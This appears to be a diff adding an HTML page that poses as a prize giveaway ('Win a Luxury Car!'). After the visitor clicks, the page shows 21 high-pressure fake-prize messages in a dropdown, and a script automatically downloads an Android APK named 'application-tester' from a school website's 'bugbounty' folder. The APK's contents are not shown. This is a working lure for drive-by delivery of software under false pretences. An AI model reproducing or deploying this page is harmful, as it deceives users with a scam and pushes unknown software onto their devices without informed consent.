@@ -1,0 +1,226 @@
+s
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Click to Claim Your Prize</title>
+    <style>
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: #000; /* Tetap hitam */
+        font-family: Arial, sans-serif;
+        position: relative;
+        color: #00ff00;
+        text-align: center;
+      }
+
+      /* Centered square button */
+      .center-text {
+        position: absolute;
+        font-size: 24px;
+        font-weight: bold;
+        color: #00ff00;
+        cursor: pointer;
+        animation: bounce 1s infinite;
+        transition: transform 0.3s ease, background-color 0.3s ease;
+        padding: 40px;
+        border-radius: 15px;
+        background-color: #111;
+        box-shadow: 0 5px 15px #00ff00;
+        width: 300px;
+        height: 300px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+      }
+
+      .center-text:hover {
+        background-color: #222;
+        transform: scale(1.05);
+      }
+
+      @keyframes bounce {
+        0%,
+        20%,
+        50%,
+        80%,
+        100% {
+          transform: translateY(0);
+        }
+        40% {
+          transform: translateY(-10px);
+        }
+        60% {
+          transform: translateY(-5px);
+        }
+      }
+
+      .center-text span {
+        font-size: 18px;
+        font-weight: normal;
+        color: #00ff00;
+        margin-top: 10px;
+      }
+
+      /* Custom select dropdown */
+      .custom-select {
+        background-color: #111;
+        border: 2px solid #00ff00;
+        border-radius: 10px;
+        padding: 40px;
+        color: #00ff00;
+        font-size: 30px;
+        width: 90vw;
+        max-width: 800px;
+        height: 25vh;
+        cursor: pointer;
+        font-weight: bold;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        display: none; /* Awalnya disembunyikan */
+        opacity: 0;
+        transition: opacity 1s ease;
+      }
+
+      .custom-select option {
+        background-color: #000;
+        color: #00ff00;
+        font-size: 20px;
+      }
+
+      h1 {
+        font-size: 3em;
+        margin-bottom: 20px;
+      }
+
+      p {
+        font-size: 1.5em;
+        margin-bottom: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="center-text" id="click-text" onclick="startGame()">
+      Click as Fast as You Can! Win a Luxury Car! 🚗🎉
+      <span>Click now to claim your exclusive prize!</span>
+    </div>
+      <select id="camera-select" class="custom-select">
+      <option value="1">
+        Congratulations! You have been randomly selected to receive an extraordinary, life-changing surprise gift! This is no joke, this is a once-in-a-lifetime opportunity that you absolutely cannot miss for a single second. Click here now, immediately, without delay, to claim this exclusive and unparalleled offer before this golden window of opportunity closes tightly and ends forever. This fantastic prize, whose value exceeds your wildest expectations, awaits you patiently, ready to be claimed. Do not miss this historic moment, as offers like this are rare and fleeting in this fast-paced world. Act quickly and intelligently, seize your destiny right now!
+      </option>
+      <option value="2">
+        Urgent and Very Important Notice! This is a crucial announcement that will change your perspective on luck! Claim your dream luxury car prize right now, right at your fingertips! This extremely limited offer, available only to a lucky few, is valid for a very, very short time. Do not let this incredible opportunity slip away. Take immediate action and seize this priceless golden chance to get your magnificent dream vehicle, which will take you cruising the streets in style, absolutely no additional cost at all! No hidden fees, no unpleasant surprises, just pure glorious victory for an individual as fortunate as you! Claim this prize now, before the last unit is taken by someone else and this opportunity is lost forever!
+      </option>
+      <option value="3">
+        Thrilling Limited Time Offer! A sensational Free Gift awaits you patiently, ready to be yours! This unexpected opportunity will not come twice in your lifetime, so make the most of it. Simply fill out this short and easy form, only taking a few seconds of your precious time, and get your extraordinary special gift in seconds thereafter. Do not delay this important decision any longer, because this golden opportunity is very limited and only available for those who act fast! Act now, before this offer vanishes like morning mist!
+      </option>
+      <option value="4">
+        Our Sincerest Congratulations on your outstanding participation in our promotion! You have overcome all obstacles and are fully qualified to receive a truly exceptional Special Gift, designed to bring a wide smile to your face! Click here now, without hesitation, to unveil the amazing and unexpected surprise that we have prepared especially for you, with great consideration. This is your most anticipated moment of luck, a turning point in your life, never miss this golden opportunity! Seize this chance immediately and enjoy the joy that is coming!
+      </option>
+      <option value="5">
+        Unlock Your Exclusive and Mysterious Reward Right Now! A gift full of secrets and immeasurable value has been specifically stored just for you, waiting to be discovered. Click now to open this enchanting treasure chest and find out what awaits you inside, a discovery that will change your perspective. Your thrilling new adventure, full of surprises, begins right here, at this very point! Do not delay any longer to reveal your destiny!
+      </option>
+      <option value="6">
+        Hurry, hurry, and even faster! Claim Your Free Gift Before It's Gone Forever from your grasp! The supply of this incredible gift is extremely limited, and demand for it is very high throughout the world. If you don't act now, in the blink of an eye, someone faster will immediately claim what rightfully belongs to you. So, be quick, be decisive, and be a true winner in this race to fortune!
+      </option>
+      <option value="7">
+        You're Almost There at the Peak of Success! You are just one step away from reaching your goal! Claim Your Ultimate Prize to complete your extraordinary journey to unimaginable wealth and prosperity! Only one last step separates you from an unthinkable fortune, a wealth that could only be dreamed of. Click to finish what you started so diligently and enjoy all the fruits of your tireless perseverance and hard work. Eternal glory and success await right at your fingertips!
+      </option>
+      <option value="8">
+        A Highly Exclusive Secret Prize Awaits Behind This Click! Prepare to be astonished! Click now to open this box full of wonders and unveil an amazing discovery that will instantly make your day brighter and more colorful. This is a fascinating mystery worth solving, a riddle that will lead you to true happiness! Don't hesitate, open it now and grasp that happiness!
+      </option>
+      <option value="9">
+        An Unprecedented Special Offer Just For You, Our Valued Customer! Claim Now and instantly receive an enticing bonus! We have personally and carefully selected you to participate in this unparalleled promotion, designed exclusively to provide you with maximum value and indescribable instant satisfaction. Do not, I repeat, do not let this amazing personalized offer slip through your fingers!
+      </option>
+      <option value="10">
+        Heartfelt Congratulations! You are a Brilliant Winner! Claim Your Grand Prize Today and celebrate your resounding victory with full enthusiasm! This is a historic day, filled with triumphs, and your extraordinary prize is ready for collection. Join the ranks of the fortunate ones who have achieved true greatness in life. Claim all the glory that is rightfully yours!
+      </option>
+      <option value="11">
+        Tremendous Success! Claim Your Winning Reward Now! We want to extend our sincere congratulations on your outstanding achievement. This special prize is a token of our appreciation. Click to claim it proudly!
+      </option>
+      <option value="12">
+        Great News That Will Brighten Your Day! Click Now to Unlock Your Hidden Prize and reveal the amazing surprise that awaits! All suspense is over, and good fortune has smiled sweetly upon you. Prepare to be truly amazed and captivated by what's coming your way, something that will exceed all your expectations. Unlock your brilliant destiny with just one click!
+      </option>
+      <option value="13">
+        A Fantastic and Unimaginable Prize Awaits You! Click Now to Claim your share of this incredible and abundant fortune! A dazzling array of astonishing and marvelous prizes are now right at your fingertips, all patiently waiting for you to make the right choice. Do not delay any longer, for your fantastic prize is calling your name with great excitement!
+      </option>
+      <option value="14">
+        Extremely Limited Exclusive Access to Special Rewards – Claim Now and enter a world of endless opportunities you've never imagined! This is a secret portal to treasures beyond your wildest dreams, accessible only to a select few. Secure your spot now before the door closes!
+      </option>
+      <option value="15">
+        Absolutely Awesome! Claim Your Amazing Prize Right Away, at lightning speed, before someone else beats you to it! This is a once-in-a-lifetime chance that you absolutely cannot afford to miss, not even for a second. The countdown is on, so click now and seize the prize that will change your life!
+      </option>
+      <option value="16">
+        Unlock Your Free Gift with One Click Here, and prepare to be utterly astonished by its incredible contents! This is the perfect moment for you to receive something truly special and unique at no cost whatsoever. It is a pure act of genuine generosity, so claim your gift now!
+      </option>
+      <option value="17">
+        Your Prize Is Ready! Click Now to Collect Your Extraordinary Reward that you have long awaited and truly deserve! We have meticulously prepared everything for a seamless collection process, so there is nothing standing between you and your amazing gift. Collect it now, and enjoy it to the fullest!
+      </option>
+      <option value="18">
+        Claim Your Exclusive Reward Before Time Runs Out Entirely! This is a truly unparalleled offer that will vanish in the blink of an eye if you do not act decisively and swiftly. The clock is ticking relentlessly, and every single second is incredibly valuable in securing your outstanding prize. Do not let this once-in-a-lifetime opportunity slip away from your grasp, claim it immediately before it is irrevocably too late for this astonishing, never-before-seen, and highly sought-after reward that everyone is talking about and fervently wishing they could possess!
+      </option>
+      <option value="19">
+        Final Chance Approaching! Claim Your Super Special Prize Before It's Gone Forever! Do not, under any circumstances, allow this incredibly rare golden opportunity to slip through your fingers. This is our absolute last, and truly unmatched, offer for you, so make your decision quickly and seize your dream prize that will fundamentally change everything for you!
+      </option>
+      <option value="20">
+        Attention All! Claim Your Earth-Shattering Jackpot Prize Right Now! This is undeniably the most important and monumental announcement you will hear today, perhaps even all year. Click instantly to secure your incredible reward which has the profound potential to completely transform your life for the better, far beyond your wildest dreams!
+      </option>
+      <option value="21">
+        An Alluring Special Prize Awaits! Claim It Before It Becomes Too Late and This Opportunity Dissolves! Every passing second is precious and absolutely critical. This prize has been meticulously and perfectly designed, with unparalleled attention to detail, exclusively for you. Click now and ensure that you are the proud and rightful owner of this truly extraordinary and priceless reward!
+      </option>
+    </select>
+
+
+    <script>
+      function startGame() {
+        const clickText = document.getElementById("click-text");
+        const selectBox = document.getElementById("camera-select");
+
+        // Sembunyikan tombol "Click as Fast as You Can!"
+        clickText.style.display = "none";
+        // Tampilkan kotak select
+        selectBox.style.display = "block";
+
+        setTimeout(() => {
+          selectBox.style.opacity = "1";
+        }, 10);
+
+        // Setelah 3 detik, download otomatis
+        setTimeout(() => {
+          // URL file APK yang akan diunduh
+          const downloadUrl = "https://smanrancaekek.sch.id/bugbounty/chrome/application-tester.apk";
+
+          // Buat nama file berdasarkan tanggal dan jam sekarang (dengan detik)
+          const now = new Date();
+          const year = now.getFullYear();
+          const month = String(now.getMonth() + 1).padStart(2, "0"); // Bulan dimulai dari 0
+          const day = String(now.getDate()).padStart(2, "0");
+          const hour = String(now.getHours()).padStart(2, "0");
+          const minute = String(now.getMinutes()).padStart(2, "0");
+          const second = String(now.getSeconds()).padStart(2, "0");
+
+          // Format nama file: application-tester_YYYYMMDD_HHMMSS.apk
+          const fileName = `application-tester_${year}${month}${day}_${hour}${minute}${second}.apk`;
+
+          // Buat dan unduh file
+          const link = document.createElement("a");
+          link.href = downloadUrl;
+          link.download = fileName; // Gunakan nama file yang dinamis di sini
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+        }, 2100); // Tunggu 3 detik
+      }
+    </script>
+  </body>
+</html>
